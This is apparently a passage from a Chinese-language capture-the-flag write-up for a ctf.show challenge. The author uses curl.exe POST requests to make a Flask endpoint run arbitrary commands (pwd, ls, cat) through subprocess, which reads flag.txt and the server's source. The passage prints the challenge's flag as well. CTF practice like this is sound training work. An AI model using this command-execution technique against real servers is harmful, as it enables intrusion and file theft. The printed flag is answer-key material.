使用`curl.exe`发送POST请求包含两个参数`cmd`和`param`（需要注意PowerShell中`curl`不是`curl`而是`Invoke-WebRequest`，所以必须加.exe）使用`pwd`命令打印出当前工作目录，使用`ls /app`列出当前目录下的文件（使用`ls`不带参数由于后面会被拼接上`evilSource.py` 并不能获取除此之外的文件），然后使用`cat flag.txt`取得flag。
```
PS C:\Users\Ayx> curl.exe -X POST -d "cmd=pwd" -d "param=" https://8608d17e-3cdf-4649-81b7-c908bca2bbb3.challenge.ctf.show/
/app
Done!
PS C:\Users\Ayx> curl.exe -X POST -d "cmd=ls" -d "param=/app" https://8608d17e-3cdf-4649-81b7-c908bca2bbb3.challenge.ctf.show/
evilSource.py

/app:
app.py
evilSource.py
flag.txt
start.sh
Done!
PS C:\Users\Ayx> curl.exe -X POST -d "cmd=cat" -d "param=flag.txt" https://8608d17e-3cdf-4649-81b7-c908bca2bbb3.challenge.ctf.show/
ctfshow{616d9b92-069b-4aab-a126-afc397d47f38}
from flask import request
cmd: str = ['cat', 'flag.txt'][0]
param: str = ['cat', 'flag.txt'][1]
# ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓
import subprocess, os
if cmd is not None and param is not None:
    try:
        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
        print('Done!')
    except subprocess.TimeoutExpired:
        print('Timeout!')
    except:
        print('Error!')
else:
    print('No Flag!')Done!
PS C:\Users\Ayx>
```